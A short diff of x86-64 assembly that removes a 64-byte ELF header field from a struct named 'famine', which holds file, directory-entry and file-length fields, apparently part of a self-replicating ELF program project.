@@ -62,7 +62,6 @@ struc famine
     .fd_file            resq    1
     .dirent_struc       resb    1024
     .dir_name_pointer   resq    1
-    .elf_ehdr           resb    64
     .file_original_len  resd    1 
 endstruc
 
